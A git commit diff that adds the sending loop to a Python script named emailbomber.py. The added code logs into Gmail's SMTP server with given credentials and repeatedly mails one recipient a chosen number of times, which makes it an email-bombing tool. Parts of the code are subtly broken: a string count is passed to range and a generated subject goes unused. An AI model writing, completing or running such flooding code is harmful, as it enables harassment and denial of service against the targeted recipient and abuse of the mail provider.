2a0c74ddd663ee0a35e248af2f2787625c37a577
krishpranav <krisna.pranav@gmail.com>
2021-04-08 14:28:03 +0530

    done changes

--- emailbomber.py
+++ emailbomber.py
@@ -35,3 +35,24 @@ total = input('Number of send: ')
 
 smtp_server = 'smtp.gmail.com'
 port = 587
+
+try:
+    server = smtplib.SMTP(smtp_server,port) 
+    server.ehlo()
+    server.starttls()
+    server.login(email,passwd)
+    for i in range(1, total+1):
+        subject = os.urandom(9)
+        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
+        server.sendmail(email,to,msg)
+        print "\rE-mails sent: %i" % i
+        time.sleep(1)
+        sys.stdout.flush()
+    server.quit()
+    print '\n Done !!!'
+except KeyboardInterrupt:
+    print '[-] Canceled'
+    sys.exit()
+except smtplib.SMTPAuthenticationError:
+    print '\n[!] The username or password you entered is incorrect.'
+sys.exit()
